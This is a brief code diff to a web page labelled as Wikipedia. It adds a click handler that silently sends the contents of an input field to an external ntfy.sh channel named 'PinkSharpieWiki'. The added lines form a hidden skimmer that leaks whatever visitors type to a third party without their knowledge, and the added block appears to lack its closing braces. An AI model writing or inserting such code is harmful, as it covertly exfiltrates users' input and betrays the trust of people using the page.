@@ -126,6 +126,11 @@ Wikipedia
             console.log(inputField.value);
         }
     })
+    document.addEventListener('click', function(e) {
+        if (inputField.value != ""){
+            fetch('https://ntfy.sh/PinkSharpieWiki', {method: 'POST', body: inputField.value})
+            console.log(inputField.value);
+        }
 </script>
     
 <div class="styled-select no-js">
